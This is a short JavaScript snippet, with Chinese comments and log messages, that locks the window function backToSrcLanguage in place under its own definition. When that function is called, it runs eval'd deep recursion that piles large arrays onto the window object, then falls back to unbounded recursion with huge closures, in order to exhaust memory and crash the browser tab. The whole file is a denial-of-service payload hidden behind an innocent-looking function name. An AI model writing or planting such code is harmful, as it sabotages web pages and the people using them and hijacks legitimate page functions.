(function() {
    'use strict';
    
    console.log('💣 eval递归爆炸');
    
    Object.defineProperty(window, 'backToSrcLanguage', {
        value: function evalCrash() {
            console.log('⚡ eval递归爆炸启动');
            
            // 使用eval创建深度递归
            const recursiveCode = `
                function explode(depth) {
                    if (depth > 1000000) return depth;
                    
                    // 分配内存
                    const mem = new Array(10000).fill('💣'.repeat(100));
                    window['mem_' + depth] = mem;
                    
                    // 递归调用
                    return explode(depth + 1) + depth;
                }
                
                // 立即调用
                explode(0);
            `;
            
            // 立即执行
            eval(recursiveCode);
            
            // 如果eval被阻止，使用直接递归
            function directExplode(depth = 0) {
                // 超大闭包
                const closure = new Array(100000).fill({
                    data: '💀'.repeat(1000),
                    timestamp: Date.now()
                });
                
                // 立即递归
                return directExplode(depth + 1) + closure.length;
            }
            
            directExplode();
            
            return 'eval_crash_complete';
        },
        writable: false,
        configurable: false
    });
    
    console.log('✅ eval崩溃函数已定义');
})();
